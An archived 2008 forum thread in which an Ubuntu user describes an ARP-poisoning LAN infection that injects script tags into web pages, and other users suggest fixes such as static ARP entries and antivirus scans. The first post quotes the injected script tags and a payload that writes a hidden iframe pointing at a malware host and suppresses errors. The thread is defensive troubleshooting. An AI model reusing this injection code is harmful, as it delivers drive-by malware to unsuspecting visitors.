---
title: "Very Strange Lan Virus"
date: 2008-09-09
forum: Security
---

### Post by amaiko on 2008-09-09
[COLOR="Red"]**_DO NOT OPEN THE LINKS IN THIS PAGE_**[/COLOR]

Hello guys,
I'm Ubuntu and I'm facing very strange lan virus. There about 25 computers in my network used shared connection and all of them using Windows and I'm the only one that use Linux so I was far away from all the viruses BUT these days are gone :)
There's a virus ( Lan Virus ) on our network where evey page I open insert this code on the top of it
[COLOR="Red"]<script language="javascript" SRC="http://v.freefl.info/day.js"></script>[/COLOR]
this virus makes the internet more slower with many disconnections some pages hang and don't open and some times Firefox freeze and some files when I tried to download them because of this virus some other EXE files were trying to download instead of this files.

to know more about this virus read this >>
> 
This is LAN virus which infects some computers in the LAN cloning server's MAC adress and turning them into the proxy servers, and making, frankly speaking, TWO servers in the network. Thus, if there's a virus proxy server - it pastes the code mentioned above in each page and sends these pages to the computers in the LAN.

That code slows down the speed very much cause it calls other pages to be loaded.

Antivirus will not help much 'cause it either will hang on the browser or with each page says the virus is detected. There's problem not in client (your) computer.

If you're in the LAN you can check out the arp table in comand promt -> cmd -> arp -a
The arp table will show two identical MAC's whitch is abnormal in normal work.

If you disconnect infected the computer from network, other one infected will take the role of false proxy server.



without thinking I installed AdBlock Ext in Firefox and blocked this script then Imade a little change in the hosts and made this link v.freefl.info opens 127.0.0.3 to make sure that this virus will never install 
 not only that but I disabled DHCP from the control panel of the router 

and I thought there's no way that this virus will appear again 

BUT today when I was opening google.com I found some strange URLs in the status bar >> View Source >> and found this
[COLOR="Red"]<script language="javascript" SRC="http://ad.userads.info/ads.js"></script>    [/COLOR]    

and if you broser this script you will find this
document.writeln("<script>");
document.writeln("function oK_Begin(){");
document.writeln("var Then = new Date() ");
document.writeln("Then.setTime(Then.getTime() + 24*60*60*1000)");
document.writeln("var cookieString = new String(document.cookie)");
document.writeln("var cookieHeader = \"Cookie1=\" ");
document.writeln("var beginPosition = cookieString.indexOf(cookieHeader)");
document.writeln("if (beginPosition != -1){ ");
document.writeln("} else ");
document.writeln("{ document.cookie = \"Cookie1=POPWINDOS;expires=\"+ Then.toGMTString() ");
document.writeln("document.write(\'<iframe width=0 height=0 src=\"http://ad.userads.info/in.htm\"><\/iframe>\');");
document.writeln("}");
document.writeln("}");
document.writeln("oK_Begin();");
document.writeln("<\/script>");
document.writeln("<script>window.onerror=function(){return true;}<\/script>")

which contains  this Iframe
[COLOR="Red"]<iframe width=0 height=0 src=\"http://ad.userads.info/in.htm\"><\/iframe> 
[/COLOR]          
and If you open this page [http://ad.userads.info/in.htm](http://ad.userads.info/in.htm) you will find a million script like the first one      
NOW HOW CAN I PREVENT THESE VIRUSES FROM ACCESSING MY PC THROWTH NETWORK     ??                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
Is there's a port that I can close or something 

Thanks in advance

---

### Post by hyper_ch on 2008-09-09
> **amaiko said:**
> I'm the only one that use Linux so I was far away from all the viruses BUT these days are gone :)
No, those days are not gone. The virus did not infect your machine, did it?

> **amaiko said:**
> NOW HOW CAN I PREVENT THESE VIRUSES FROM ACCESSING MY PC THROWTH NETWORK
As far I can read from what you posted is, that it did not access your pc at all. It just makes you believe that it's the actual gateway through which your internet queries have to go.

---

### Post by cdenley on 2008-09-09
Sounds like someone else's infected computer is performing a man-in-the-middle attack with ARP poisoning. Maybe if you set the correct address as a permanent entry in your ARP table, you won't be using infected clients as your gateway anymore. Good luck figuring out the correct MAC address, since all the infected machines are going to give the same ARP reply.
```

sudo arp -s 192.168.0.1 xx:xx:xx:xx:xx:xx

```

---

### Post by HermanAB on 2008-09-09
Yup, you got to clean up all the Windoze PCs.

Cheers,

Herman

---

### Post by jimv on 2008-09-09
Update your antivirus on all of your machines, then disconnect them all from the network.  Run a full virus scan on each one, and then bring each one back onto the network.

Also, after you bring a computer back online, check with the Ubuntu machine to see if you're still getting that code inserted into your pages.  So you'll probably want to scan the machine that is the internet gateway first.

---

### Post by gtdaqua on 2008-09-10
Scan the windows machines first- and disconnect the machines from the network when your run the scan. This way, even a slow script should not load.

---

